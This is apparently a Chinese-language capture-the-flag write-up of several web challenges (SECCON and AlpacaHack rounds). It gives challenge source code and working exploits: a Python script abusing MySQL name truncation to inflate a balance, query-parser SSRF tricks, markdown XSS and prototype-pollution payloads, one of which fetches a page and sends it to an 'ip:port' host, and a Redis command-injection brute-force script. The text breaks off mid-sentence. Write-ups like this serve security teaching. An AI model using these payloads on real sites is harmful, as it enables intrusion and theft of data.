process.env.FLAG ?? console.log(\u0026#34;No flag\u0026#34;) ?? process.exit(1); const TRILLION = 1_000_000_000_000; const app = fastify(); app.register(await import(\u0026#34;@fastify/jwt\u0026#34;), { secret: crypto.randomBytes(32), cookie: { cookieName: \u0026#34;session\u0026#34; }, }); app.register(await import(\u0026#34;@fastify/cookie\u0026#34;)); const names = new Set(); const auth = async (req, res) =\u0026gt; { try { await req.jwtVerify(); } catch { return res.status(401).send({ msg: \u0026#34;Unauthorized\u0026#34; }); } }; app.post(\u0026#34;/api/register\u0026#34;, async (req, res) =\u0026gt; { const name = String(req.body.name); if (!/^[a-z0-9]+$/.test(name)) { res.status(400).send({ msg: \u0026#34;Invalid name\u0026#34; }); return; } if (names.has(name)) { res.status(400).send({ msg: \u0026#34;Already exists\u0026#34; }); return; } names.add(name); const [result] = await db.query(\u0026#34;INSERT INTO users SET ?\u0026#34;, { name, balance: 10, }); res .setCookie(\u0026#34;session\u0026#34;, await res.jwtSign({ id: result.insertId })) .send({ msg: \u0026#34;Succeeded\u0026#34; }); }); app.get(\u0026#34;/api/me\u0026#34;, { onRequest: auth }, async (req, res) =\u0026gt; { try { const [{ 0: { balance } }] = await db.query(\u0026#34;SELECT * FROM users WHERE id = ?\u0026#34;, [req.user.id]); req.user.balance = balance; } catch (err) { return res.status(500).send({ msg: err.message }); } if (req.user.balance \u0026gt;= TRILLION) { req.user.flag = FLAG; // 💰 } res.send(req.user); }); app.post(\u0026#34;/api/transfer\u0026#34;, { onRequest: auth }, async (req, res) =\u0026gt; { const recipientName = String(req.body.recipientName); if (!names.has(recipientName)) { res.status(404).send({ msg: \u0026#34;Not found\u0026#34; }); return; } const [{ 0: { id } }] = await db.query(\u0026#34;SELECT * FROM users WHERE name = ?\u0026#34;, [recipientName]); if (id === req.user.id) { res.status(400).send({ msg: \u0026#34;Self-transfer is not allowed\u0026#34; }); return; } const amount = parseInt(req.body.amount); if (!isFinite(amount) || amount \u0026lt;= 0) { res.status(400).send({ msg: \u0026#34;Invalid amount\u0026#34; }); return; } const conn = await db.getConnection(); try { await conn.beginTransaction(); const [{ 0: { balance } }] = await conn.query(\u0026#34;SELECT * FROM users WHERE id = ? FOR UPDATE\u0026#34;, [ req.user.id, ]); if (amount \u0026gt; balance) { throw new Error(\u0026#34;Invalid amount\u0026#34;); } await conn.query(\u0026#34;UPDATE users SET balance = balance - ? WHERE id = ?\u0026#34;, [ amount, req.user.id, ]); await conn.query(\u0026#34;UPDATE users SET balance = balance + ? WHERE name = ?\u0026#34;, [ amount, recipientName, ]); await conn.commit(); } catch (err) { await conn.rollback(); return res.status(500).send({ msg: err.message }); } finally { db.releaseConnection(conn); } res.send({ msg: \u0026#34;Succeeded\u0026#34; }); }); app.get(\u0026#34;/\u0026#34;, async (req, res) =\u0026gt; { const html = await fs.readFile(\u0026#34;index.html\u0026#34;); res.type(\u0026#34;text/html; charset=utf-8\u0026#34;).send(html); }); app.listen({ port: 3000, host: \u0026#34;0.0.0.0\u0026#34; }); 需要拿到1000000000000。\n转账时发送方根据id扣除余额，接收方根据name增加余额。虽然后端设置禁止注册同名用户，但调用mysql时并没有验证是否有同名用户。\n数据库使用TEXT类型保存name，TEXT最大长度为65535，docker配置了mysql参数--sql_mode为空，所以当数据发生溢出时不会报错直接截断。因此可以在mysql中插入同名用户。\nexp:\nimport requests import time url = \u0026#39;\u0026#39; base_name = \u0026#39;z\u0026#39;*65535 def reg(name : str) -\u0026gt; tuple[str, str, str]: res1 = requests.post(url=url + \u0026#39;/api/register\u0026#39;, json={\u0026#34;name\u0026#34; : base_name}) jwt_1 = res1.headers.get(\u0026#39;set-cookie\u0026#39;).split(\u0026#39;session=\u0026#39;, 1)[-1].split(\u0026#39;;\u0026#39;, 1)[0] res2 = requests.post(url=url + \u0026#39;/api/register\u0026#39;, json={\u0026#34;name\u0026#34; : base_name + name}) jwt_2 = res2.headers.get(\u0026#39;set-cookie\u0026#39;).split(\u0026#39;session=\u0026#39;, 1)[-1].split(\u0026#39;;\u0026#39;, 1)[0] res3 = requests.post(url=url + \u0026#39;/api/register\u0026#39;, json={\u0026#34;name\u0026#34; : base_name + name + name}) jwt_3 = res3.headers.get(\u0026#39;set-cookie\u0026#39;).split(\u0026#39;session=\u0026#39;, 1)[-1].split(\u0026#39;;\u0026#39;, 1)[0] return (jwt_1, jwt_2, jwt_3) if __name__ == \u0026#39;__main__\u0026#39;: jwt_1, jwt_2, jwt_3 = reg(\u0026#39;ajdjsbvkj\u0026#39;) balance = 10 while (balance * 2 - 10) \u0026lt; 1_000_000_000_000: time.sleep(0.5) res = requests.post(url=url + \u0026#39;/api/transfer\u0026#39;, json={\u0026#34;recipientName\u0026#34; : base_name, \u0026#34;amount\u0026#34; : balance}, cookies={\u0026#34;session\u0026#34; : jwt_2}) res = requests.post(url=url + \u0026#39;/api/transfer\u0026#39;, json={\u0026#34;recipientName\u0026#34; : base_name, \u0026#34;amount\u0026#34; : balance}, cookies={\u0026#34;session\u0026#34; : jwt_3}) balance = balance * 2 print(balance * 2 - 10, end=\u0026#39;\\r\u0026#39;) print(jwt_1) self-ssrf 题目代码：\nimport express from \u0026#34;express\u0026#34;; const PORT = 3000; const LOCALHOST = new URL(`http://localhost:${PORT}`); const FLAG = Bun.env.FLAG!!; const app = express(); app.use(\u0026#34;/\u0026#34;, (req, res, next) =\u0026gt; { if (req.query.flag === undefined) { const path = \u0026#34;/flag?flag=guess_the_flag\u0026#34;; res.send(`Go to \u0026lt;a href=\u0026#34;${path}\u0026#34;\u0026gt;${path}\u0026lt;/a\u0026gt;`); } else next(); }); app.get(\u0026#34;/flag\u0026#34;, (req, res) =\u0026gt; { res.send( req.query.flag === FLAG // Guess the flag ? `Congratz! The flag is \u0026#39;${FLAG}\u0026#39;.` : `\u0026lt;marquee\u0026gt;🚩🚩🚩\u0026lt;/marquee\u0026gt;` ); }); app.get(\u0026#34;/ssrf\u0026#34;, async (req, res) =\u0026gt; { try { const url = new URL(req.url, LOCALHOST); if (url.hostname !== LOCALHOST.hostname) { res.send(\u0026#34;Try harder 1\u0026#34;); return; } if (url.protocol !== LOCALHOST.protocol) { res.send(\u0026#34;Try harder 2\u0026#34;); return; } url.pathname = \u0026#34;/flag\u0026#34;; url.searchParams.append(\u0026#34;flag\u0026#34;, FLAG); res.send(await fetch(url).then((r) =\u0026gt; r.text())); } catch { res.status(500).send(\u0026#34;:(\u0026#34;); } }); app.listen(PORT); 访问server需要带有flag参数，而ssrf也会添加一个flag参数，有重复键时express会用逗号拼接:\n/?flag=1\u0026amp;flag=flag -\u0026gt; req.query.flag = \u0026#39;1,flag\u0026#39; express解析query 先解析url，随后处理url.query，并赋值给req.query\n// express.middleware.query return function query(req, res, next){ if (!req.query) { var val = parseUrl(req).query; req.query = queryparse(val, opts); } next(); }; express解析query使用的是qs库。\nqueryparse代码如下：\n// qs.parse module.exports = function (str, opts) { var options = normalizeParseOptions(opts); if (str === \u0026#39;\u0026#39; || str === null || typeof str === \u0026#39;undefined\u0026#39;) { return options.plainObjects ? Object.create(null) : {}; } var tempObj = typeof str === \u0026#39;string\u0026#39; ? parseValues(str, options) : str; var obj = options.plainObjects ? Object.create(null) : {}; // Iterate over the keys and setup the new object var keys = Object.keys(tempObj); for (var i = 0; i \u0026lt; keys.length; ++i) { var key = keys[i]; var newObj = parseKeys(key, tempObj[key], options, typeof str === \u0026#39;string\u0026#39;); obj = utils.merge(obj, newObj, options); } if (options.allowSparse === true) { return obj; } return utils.compact(obj); }; parseValues函数将各键的值解析，parseKeys函数将键名解析，最后merge到一起。\nparseValues函数关键代码如下：\nvar parseValues = function parseQueryStringValues(str, options) { var obj = { __proto__: null }; var cleanStr = options.ignoreQueryPrefix ? str.replace(/^\\?/, \u0026#39;\u0026#39;) : str; cleanStr = cleanStr.replace(/%5B/gi, \u0026#39;[\u0026#39;).replace(/%5D/gi, \u0026#39;]\u0026#39;); var limit = options.parameterLimit === Infinity ? undefined : options.parameterLimit; var parts = cleanStr.split(options.delimiter, limit); var skipIndex = -1; // Keep track of where the utf8 sentinel was found var i; ...... for (i = 0; i \u0026lt; parts.length; ++i) { if (i === skipIndex) { continue; } var part = parts[i]; var bracketEqualsPos = part.indexOf(\u0026#39;]=\u0026#39;); var pos = bracketEqualsPos === -1 ? part.indexOf(\u0026#39;=\u0026#39;) : bracketEqualsPos + 1; var key, val; if (pos === -1) { key = options.decoder(part, defaults.decoder, charset, \u0026#39;key\u0026#39;); val = options.strictNullHandling ? null : \u0026#39;\u0026#39;; } else { key = options.decoder(part.slice(0, pos), defaults.decoder, charset, \u0026#39;key\u0026#39;); val = utils.maybeMap( parseArrayValue(part.slice(pos + 1), options), function (encodedVal) { return options.decoder(encodedVal, defaults.decoder, charset, \u0026#39;value\u0026#39;); } ); } ...... if (part.indexOf(\u0026#39;[]=\u0026#39;) \u0026gt; -1) { val = isArray(val) ? [val] : val; } var existing = has.call(obj, key); if (existing \u0026amp;\u0026amp; options.duplicates === \u0026#39;combine\u0026#39;) { obj[key] = utils.combine(obj[key], val); } else if (!existing || options.duplicates === \u0026#39;last\u0026#39;) { obj[key] = val; } } return obj; }; options.duplicates默认是combine，所以重复键会用逗号拼接。\n解析时先通过\u0026amp;分割，然后再用=分割键和值。\n注意分割方式：\nvar bracketEqualsPos = part.indexOf(\u0026#39;]=\u0026#39;); var pos = bracketEqualsPos === -1 ? part.indexOf(\u0026#39;=\u0026#39;) : bracketEqualsPos + 1; 当出现]=时，优先使用]=所在的索引。而内置库的URL是根据第一个=分割的：\nnew URL(\u0026#39;http://localhost:3000/asd?flag=]=asd\u0026#39;); // searchParams: URLSearchParams { \u0026#39;flag\u0026#39; =\u0026gt; \u0026#39;]=asd\u0026#39; } 解法 URL()会对除了作为分隔符以外的=进行URL编码。qs只会对[]进行URL解码：\ncleanStr = cleanStr.replace(/%5B/gi, \u0026#39;[\u0026#39;).replace(/%5D/gi, \u0026#39;]\u0026#39;); 当输入ssrf/?flag[=]=asd时，会进行以下处理：\n// qs第一次解析 req.query = { \u0026#34;flag\u0026#34; : { \u0026#34;=\u0026#34; : \u0026#34;asd\u0026#34; } } // URL()解析 url = \u0026#39;http://localhost:3000/flag?flag[=%5D%3Dasd\u0026amp;flag=SECCON\u0026#39; // qs第二次解析 req.query = { \u0026#34;flag\u0026#34; : \u0026#34;SECCON\u0026#34;, \u0026#34;flag[\u0026#34; : \u0026#34;]=asd\u0026#34; } Tanuki_Udon 一个blog系统，支持markdown格式，尝试xss。\nmarkdown处理函数：\nconst escapeHtml = (content) =\u0026gt; { return content .replaceAll(\u0026#39;\u0026amp;\u0026#39;, \u0026#39;\u0026amp;amp;\u0026#39;) .replaceAll(`\u0026#34;`, \u0026#39;\u0026amp;quot;\u0026#39;) .replaceAll(`\u0026#39;`, \u0026#39;\u0026amp;#39;\u0026#39;) .replaceAll(\u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026amp;lt;\u0026#39;) .replaceAll(\u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026amp;gt;\u0026#39;); } const markdown = (content) =\u0026gt; { const escaped = escapeHtml(content); return escaped .replace(/!\\[([^\u0026#34;]*?)\\]\\(([^\u0026#34;]*?)\\)/g, `\u0026lt;img alt=\u0026#34;$1\u0026#34; src=\u0026#34;$2\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;`) .replace(/\\[(.*?)\\]\\(([^\u0026#34;]*?)\\)/g, `\u0026lt;a href=\u0026#34;$2\u0026#34;\u0026gt;$1\u0026lt;/a\u0026gt;`) .replace(/\\*\\*(.*?)\\*\\*/g, `\u0026lt;strong\u0026gt;$1\u0026lt;/strong\u0026gt;`) .replace(/ $/mg, `\u0026lt;br\u0026gt;`); } module.exports = markdown; 问题在于replace执行是有顺序的，前一个的img标签的引号可以通过a标签破坏。\na标签的[]内部匹配的是.*，包容性强，可以用这个分割img的引号。\n写一个测试脚本：\nconst escapeHtml = (content) =\u0026gt; { return content .replaceAll(\u0026#39;\u0026amp;\u0026#39;, \u0026#39;\u0026amp;amp;\u0026#39;) .replaceAll(`\u0026#34;`, \u0026#39;\u0026amp;quot;\u0026#39;) .replaceAll(`\u0026#39;`, \u0026#39;\u0026amp;#39;\u0026#39;) .replaceAll(\u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026amp;lt;\u0026#39;) .replaceAll(\u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026amp;gt;\u0026#39;); } const markdown = (content) =\u0026gt; { var escaped = escapeHtml(content); escaped = escaped.replace(/!\\[([^\u0026#34;]*?)\\]\\(([^\u0026#34;]*?)\\)/g, `\u0026lt;img alt=\u0026#34;$1\u0026#34; src=\u0026#34;$2\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;`); console.log(escaped); escaped = escaped.replace(/\\[(.*?)\\]\\(([^\u0026#34;]*?)\\)/g, `\u0026lt;a href=\u0026#34;$2\u0026#34;\u0026gt;$1\u0026lt;/a\u0026gt;`); console.log(escaped); escaped = escaped.replace(/\\*\\*(.*?)\\*\\*/g, `\u0026lt;strong\u0026gt;$1\u0026lt;/strong\u0026gt;`); console.log(escaped); escaped = escaped.replace(/ $/mg, `\u0026lt;br\u0026gt;`); console.log(escaped); return escaped } content = \u0026#39;![]([)]()\u0026#39; markdown(content) /* \u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;[\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;]() \u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;\u0026lt;a href=\u0026#34;\u0026#34;\u0026gt;\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;\u0026lt;a href=\u0026#34;\u0026#34;\u0026gt;\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;\u0026lt;a href=\u0026#34;\u0026#34;\u0026gt;\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;\u0026lt;/a\u0026gt; */ 新生成的a标签的href属性逃逸出了双引号，且依然在img标签内。可以使用onerror执行js代码。\npayload:\n![]([)]( onerror=alert`1` class=)\r/*\r\u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;[\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;]( onerror=alert`1` class=)\r\u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;\u0026lt;a href=\u0026#34; onerror=alert`1` class=\u0026#34;\u0026gt;\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;\u0026lt;/a\u0026gt;\r\u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;\u0026lt;a href=\u0026#34; onerror=alert`1` class=\u0026#34;\u0026gt;\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;\u0026lt;/a\u0026gt;\r\u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;\u0026lt;a href=\u0026#34; onerror=alert`1` class=\u0026#34;\u0026gt;\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;\u0026lt;/a\u0026gt;\r*/ 不过由于onerror处在markdown a标签的href属性位置，不能有)，所以使用javascript协议，就可以通过url编码绕过字符限制了。\n拿flag需要知道flag的noteid，要用bot的cookie访问/获得，cookie是Http Only的，所以直接用fetch读取页面内容。\njs payload：\nvar d;fetch(\u0026#34;/\u0026#34;).then((r) =\u0026gt; r.text()).then((data) =\u0026gt; {d = data});setTimeout(() =\u0026gt; {fetch(\u0026#39;http://ip:port?data=\u0026#39; + encodeURI(d))}, 500); xss payload:\n![1]([)]( onerror=location=`javascript:var%20d%3Bfetch%28%22%2F%22%29%2Ethen%28%28r%29%20%3D%3E%20r%2Etext%28%29%29%2Ethen%28%28data%29%20%3D%3E%20%7Bd%20%3D%20data%7D%29%3BsetTimeout%28%28%29%20%3D%3E%20%7Bfetch%28%27http%3A%2F%2Fip%3Aport%3Fdata%3D%27%20%2B%20encodeURI%28d%29%29%7D%2C%20500%29%3B` class=) 拿到noteid直接访问即可。\nJavaScrypto 又是一个note系统，服务器只保存AES CBC加密的密文和iv，key保存在用户的localstorage中。\nindex.html代码如下：\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;JavaScrypto\u0026lt;/title\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.tailwindcss.com\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js\u0026#34; integrity=\u0026#34;sha512-a+SUDuwNzXDvz4XrIcXHuCf089/iJAoN4lmrXJg18XnduKK6YlDHNRalv4yd1N40OKI80tFidF+rqTFKGPoWFQ==\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34; referrerpolicy=\u0026#34;no-referrer\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/purl/2.3.1/purl.min.js\u0026#34; integrity=\u0026#34;sha512-xbWNJpa0EduIPOwctW2N6KjW1KAWai6wEfiC3bafkJZyd0X3Q3n5yDTXHd21MIostzgLTwhxjEH+l9a5j3RB4A==\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34; referrerpolicy=\u0026#34;no-referrer\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;note.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center bg-orange-100 h-full font-mono gap-4\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;p-4 text-xl text-blue-600\u0026#34;\u0026gt; JavaS\u0026lt;span class=\u0026#34;text-yellow-600\u0026#34;\u0026gt;crypto\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;pre id=\u0026#34;note\u0026#34; class=\u0026#34;p-4 bg-slate-100 rounded w-1/2 text-center\u0026#34;\u0026gt;\u0026lt;/pre\u0026gt; \u0026lt;textarea name=\u0026#34;noteInput\u0026#34; id=\u0026#34;noteInput\u0026#34; class=\u0026#34;w-1/2 p-4\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;button id=\u0026#34;createNote\u0026#34; class=\u0026#34;p-2 bg-green-200 rounded\u0026#34;\u0026gt;Create\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; const key = getOrCreateKey(); const id = purl().param().id || localStorage.getItem(\u0026#39;currentId\u0026#39;); if (id \u0026amp;\u0026amp; typeof id === \u0026#39;string\u0026#39;) { readNote({ id, key, }).then(content =\u0026gt; { if (content) { localStorage.setItem(\u0026#39;currentId\u0026#39;, id); document.getElementById(\u0026#39;note\u0026#39;).innerHTML = content; } else { document.getElementById(\u0026#39;note\u0026#39;).innerHTML = \u0026#39;Failed to read\u0026#39;; } }); } else { document.getElementById(\u0026#39;note\u0026#39;).innerHTML = \u0026#39;No note\u0026#39;; } const onCreate = () =\u0026gt; { const content = document.getElementById(\u0026#39;noteInput\u0026#39;).value; createNote({ plaintext: content, key, }).then(id =\u0026gt; { localStorage.setItem(\u0026#39;currentId\u0026#39;, id); location.href = `/?id=${id}`; }); } document.getElementById(\u0026#39;createNote\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, onCreate); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; note.js代码如下：\nconst getOrCreateKey = () =\u0026gt; { if (!localStorage.getItem(\u0026#39;key\u0026#39;)) { const rawKey = CryptoJS.lib.WordArray.random(16); localStorage.setItem(\u0026#39;key\u0026#39;, rawKey.toString(CryptoJS.enc.Base64)); } return localStorage.getItem(\u0026#39;key\u0026#39;); } const encryptNote = ({ plaintext, key }) =\u0026gt; { const rawKey = CryptoJS.enc.Base64.parse(key); const rawIv = CryptoJS.lib.WordArray.random(16); const rawSalt = CryptoJS.lib.WordArray.random(16); const rawCiphertext = CryptoJS.AES.encrypt(plaintext, rawKey, { iv: rawIv, salt: rawSalt, }).ciphertext; return { iv: rawIv.toString(CryptoJS.enc.Base64), ciphertext: rawCiphertext.toString(CryptoJS.enc.Base64), } } const decryptNote = ({ key, iv, ciphertext }) =\u0026gt; { const rawKey = CryptoJS.enc.Base64.parse(key); const rawIv = CryptoJS.enc.Base64.parse(iv); const rawPlaintext = CryptoJS.AES.decrypt(ciphertext, rawKey, { iv: rawIv, }); return rawPlaintext.toString(CryptoJS.enc.Latin1); } const createNote = async ({ plaintext, key }) =\u0026gt; { const cipherParams = encryptNote({ plaintext, key }); const { id } = await fetch(\u0026#39;/note\u0026#39;, { method: \u0026#39;POST\u0026#39;, body: JSON.stringify(cipherParams), headers: { \u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39; } }).then(r =\u0026gt; r.json()); return id; } const readNote = async ({ id, key }) =\u0026gt; { const cipherParams = await fetch(`/note/${id}`).then(r =\u0026gt; r.json()); const { iv, ciphertext } = cipherParams; return decryptNote({ key, iv, ciphertext }); } 使用purl库解析url提取id，2.3.1版本存在原型链污染漏洞。\npayload:\n/?__proto__[asd]=asd#__proto__[test]=test bot会将flag保存在note中，需要知道id来获取密文和iv，以及key来解密flag。\nbot访问note时，只会用自己的key来解密。要通过原型链污染来使bot可以查看我们写的内容。\n题目使用了crypto-js进行AES加解密，base64解密时可以污染_reverseMap，https://github.com/brix/crypto-js/blob/develop/src/enc-base64.js#L76\nbase64解密代码：\nparse: function (base64Str) { // Shortcuts var base64StrLength = base64Str.length; var map = this._map; var reverseMap = this._reverseMap; if (!reverseMap) { reverseMap = this._reverseMap = []; for (var j = 0; j \u0026lt; map.length; j++) { reverseMap[map.charCodeAt(j)] = j; } } // Ignore padding var paddingChar = map.charAt(64); if (paddingChar) { var paddingIndex = base64Str.indexOf(paddingChar); if (paddingIndex !== -1) { base64StrLength = paddingIndex; } } // Convert return parseLoop(base64Str, base64StrLength, reverseMap); }, _map: \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#39; }; function parseLoop(base64Str, base64StrLength, reverseMap) { var words = []; var nBytes = 0; for (var i = 0; i \u0026lt; base64StrLength; i++) { if (i % 4) { var bits1 = reverseMap[base64Str.charCodeAt(i - 1)] \u0026lt;\u0026lt; ((i % 4) * 2); var bits2 = reverseMap[base64Str.charCodeAt(i)] \u0026gt;\u0026gt;\u0026gt; (6 - (i % 4) * 2); var bitsCombined = bits1 | bits2; words[nBytes \u0026gt;\u0026gt;\u0026gt; 2] |= bitsCombined \u0026lt;\u0026lt; (24 - (nBytes % 4) * 8); nBytes++; } } return WordArray.create(words, nBytes); } 可以通过污染_reverseMap来影响解密结果。由于key的值不确定，所以一般的变表解密出来的key依然不确定。\n只有通过将表中所有字符都指向一个相同的数字。比如都指向0，此时key和iv解密后都是0。这样key就确定了。\n还要保证ciphertext能正常解密，base64表需要有64个字符，而ascii码有128个字符，所以ascii码可以容纳两张不同的base64表。\n生成新表：\ndef gentable(table_org : str) -\u0026gt; str: table_new = \u0026#34;\u0026#34; for i in range(128): c = chr(i) if c in table_org: continue table_new = table_new + c return table_new table_org = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; table_new = gentable(table_org) 将xss payload用空的key和iv进行AES加密然后用新的表编码即可。值得注意的是，通过purl进行污染时新表中不能包含[和=，所以其实新表是缺失了两个字符的，所以需要fuzz出一个合适的xss payload。\nbot访问我们report的url时会将传入的id覆盖，所以需要通过xss让bot重定向到/再加载一遍flag note，然后外带。\npayload:\n\u0026lt;img src onerror=\u0026#39;w=window.open(\u0026#34;/\u0026#34;);setTimeout(()=\u0026gt;{location.href=\u0026#34;/flag?FLAG=\u0026#34;+w.document.getElementById(\u0026#34;note\u0026#34;).innerHTML},2000)\u0026#39;\u0026gt; AlpacaHack Round 7 Treasure Hunt 服务器代码如下：\napp.use((req, res, next) =\u0026gt; { res.type(\u0026#34;text\u0026#34;); if (/[flag]/.test(req.url)) { res.status(400).send(`Bad URL: ${req.url}`); return; } next(); }); app.use(express.static(\u0026#34;public\u0026#34;)); flag文件名生成：\nFLAG_PATH=./public/$(md5sum flag.txt | cut -c-32 | fold -w1 | paste -sd /)/f/l/a/g/./t/x/t 对于express来说，访问静态文件时，当某个文件夹存在时会自动加上/，也就是说如果/public/c文件夹存在：\nGET /c -\u0026gt; 301 location: /c/ 并且允许url编码。所以可以一层层爆破出文件名。\nAlpaca Poll flag存储在redis中。\n关键路由如下：\napp.post(\u0026#39;/vote\u0026#39;, async (req, res) =\u0026gt; { let animal = req.body.animal || \u0026#39;alpaca\u0026#39;; // animal must be a string animal = animal + \u0026#39;\u0026#39;; // no injection, please animal = animal.replace(\u0026#39;\\r\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;); try { return res.json({ [animal]: await vote(animal) }); } catch { return res.json({ error: \u0026#39;something wrong\u0026#39; }); } }); app.get(\u0026#39;/votes\u0026#39;, async (req, res) =\u0026gt; { return res.json(await getVotes()); }); redis相关代码：\nimport net from \u0026#39;node:net\u0026#39;; function connect() { return new Promise(resolve =\u0026gt; { const socket = net.connect(\u0026#39;6379\u0026#39;, \u0026#39;localhost\u0026#39;, () =\u0026gt; { resolve(socket); }); }); } function send(socket, data) { console.info(\u0026#39;[send]\u0026#39;, JSON.stringify(data)); socket.write(data); return new Promise(resolve =\u0026gt; { socket.on(\u0026#39;data\u0026#39;, data =\u0026gt; { console.info(\u0026#39;[recv]\u0026#39;, JSON.stringify(data.toString())); resolve(data.toString()); }) }); } export async function vote(animal) { const socket = await connect(); const message = `INCR ${animal}\\r\\n`; const reply = await send(socket, message); socket.destroy(); return parseInt(reply.match(/:(\\d+)/)[1], 10); // the format of response is like `:23`, so this extracts only the number } const ANIMALS = [\u0026#39;dog\u0026#39;, \u0026#39;cat\u0026#39;, \u0026#39;alpaca\u0026#39;]; export async function getVotes() { const socket = await connect(); let message = \u0026#39;\u0026#39;; for (const animal of ANIMALS) { message += `GET ${animal}\\r\\n`; } const reply = await send(socket, message); socket.destroy(); let result = {}; for (const [index, match] of Object.entries([...reply.matchAll(/\\$\\d+\\r\\n(\\d+)/g)])) { result[ANIMALS[index]] = parseInt(match[1], 10); } return result; } export async function init(flag) { const socket = await connect(); let message = \u0026#39;\u0026#39;; for (const animal of ANIMALS) { const votes = animal === \u0026#39;alpaca\u0026#39; ? 10000 : Math.random() * 100 | 0; message += `SET ${animal} ${votes}\\r\\n`; } message += `SET flag ${flag}\\r\\n`; // please exfiltrate this await send(socket, message); socket.destroy(); } vote函数存在注入。但getVotes只能解析数字：\nlet result = {}; for (const [index, match] of Object.entries([...reply.matchAll(/\\$\\d+\\r\\n(\\d+)/g)])) { result[ANIMALS[index]] = parseInt(match[1], 10); } return result; 查了查文档发现redis string可以进行异或运算，https://redis.io/docs/latest/commands/bitop/\n思路就是先通过异或将flag第一个字符转为数字，然后就能成功通过getVotes获得回显，再异或一次就能获得第一个字符，然后再将flag第二个字符也异或成数字，以此类推。\n复制flag\ncopy flag flagcopy 异或并复制到animal\ndel alpaca\rset xorstr \u0026#34;xxx\u0026#34;\rBITOP XOR alpaca flagcopy xorstr 检查是否有数字 /votes查看第三个数字是否成功解析，如果有，保存下来与发送的xorstr异或获得flag\n但是有个坑，似乎数字太大会溢出，所以flag后面一段得不到。\n改进以下流程，假设已经确定的flag部分：flag{abcd，对应的xor后的数字为123456789，对应的xorstr为qwertyuio，此时'qwertyuio' ^ 'flag{abcd' = '123456789'，我们可以计算出一个新的xorstr使得new_xorstr ^ 'flag{abcd' = '000000000'。\n此时我们再尝试爆破第十个字符，此时0000000001会解析为1，不会再溢出了。\nexp:\nimport requests import string import json url = \u0026#39;http://\u0026#39; cha = string.ascii_letters + string.digits copy_flag_payload = \u0026#39;dog\\r\\n\\r\\ncopy flag flagcopy\u0026#39; fuzz_flag_payload = \u0026#39;dog\\r\\n\\r\\ndel alpaca\\r\\nset xorstr \u0026#34;{}\u0026#34;\\r\\nBITOP XOR alpaca flagcopy xorstr\\r\\nget alpaca\u0026#39; def check_votes(): res = requests.get(url=url + \u0026#39;/votes\u0026#39;) res = json.loads(res.text) if \u0026#39;alpaca\u0026#39; in res: return str(res[\u0026#39;alpaca\u0026#39;]) return None def fuzz_flag(): data = { \u0026#34;animal\u0026#34; : copy_flag_payload } requests.post(url=url + \u0026#39;/vote\u0026#39;, data=data) xored_flag = \u0026#39;\u0026#39; flag = \u0026#39;\u0026#39; while True: if len(flag) \u0026gt; 0 and \u0026#39;}\u0026#39; in flag: break for i in cha: print(xored_flag + i, end=\u0026#39;\\r\u0026#39;) data = { \u0026#34;animal\u0026#34; : fuzz_flag_payload.format(xored_flag + i) } requests.post(url=url + \u0026#39;/vote\u0026#39;, data=data) xored_char = check_votes() if xored_char == None: continue elif len(xored_char) \u0026lt; 1 or xored_char == \u0026#39;0\u0026#39;: continue xor_char = str(xored_char)[0] flag = flag + chr(ord(xor_char) ^ ord(i)) xored_flag = xored_flag + chr(ord(flag[-1]) ^ ord(\u0026#39;0\u0026#39;)) print(flag) print(xored_flag) break print(flag) fuzz_flag() 可能是因为反斜杠的原因，flag中多了一个l\nminimal-waf xss题\nflag在bot cookie中，httponly为false。可以控制bot访问任意url。\nexpress代码如下：\nexpress() .get(\u0026#34;/\u0026#34;, (req, res) =\u0026gt; 